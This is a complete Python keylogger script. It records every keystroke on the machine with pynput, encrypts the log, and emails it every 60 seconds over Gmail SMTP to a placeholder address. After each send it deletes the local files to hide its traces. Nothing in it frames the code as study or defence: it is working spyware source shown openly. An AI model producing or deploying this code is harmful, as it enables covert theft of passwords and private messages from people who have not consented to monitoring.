import os
import smtplib
import threading
from pynput import keyboard
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

# Configurations
log_file = "keylog.txt"  # Temporary log file
encrypted_file = "keylog_encrypted.txt"  # Encrypted log file
email_interval = 60  # Email logs every 60 seconds
encryption_key = Fernet.generate_key()  # Generate a new encryption key
cipher = Fernet(encryption_key)

# Email settings
sender_email = "your_email@example.com"
receiver_email = "receiver_email@example.com"
email_password = "your_email_password"  # Use an app password for security

# Function to send email
def send_email():
    while True:
        try:
            # Read and encrypt log content
            if os.path.exists(log_file):
                with open(log_file, "rb") as file:
                    data = file.read()
                encrypted_data = cipher.encrypt(data)

                # Save encrypted logs
                with open(encrypted_file, "wb") as enc_file:
                    enc_file.write(encrypted_data)

                # Send encrypted logs via email
                message = MIMEMultipart()
                message["From"] = sender_email
                message["To"] = receiver_email
                message["Subject"] = "Encrypted Key Logs"

                body = "Find the encrypted key logs attached."
                message.attach(MIMEText(body, "plain"))

                # Add the encrypted file as an attachment
                with open(encrypted_file, "rb") as enc_file:
                    attachment = MIMEText(enc_file.read(), "base64")
                    attachment.add_header("Content-Disposition", "attachment", filename=encrypted_file)
                    message.attach(attachment)

                # Connect to SMTP server and send email
                with smtplib.SMTP("smtp.gmail.com", 587) as server:
                    server.starttls()
                    server.login(sender_email, email_password)
                    server.send_message(message)

                # Clear log files after sending
                os.remove(log_file)
                os.remove(encrypted_file)
        except Exception as e:
            print(f"Error in sending email: {e}")
        
        # Wait before sending the next batch of logs
        threading.Event().wait(email_interval)

# Function to log keystrokes
def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Log special keys
        with open(log_file, "a") as file:
            file.write(f" {key} ")

def on_release(key):
    if key == keyboard.Key.esc:  # Stop the keylogger when 'Esc' is pressed
        return False

# Run the email sender in a separate thread
email_thread = threading.Thread(target=send_email, daemon=True)
email_thread.start()

# Start keylogger
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
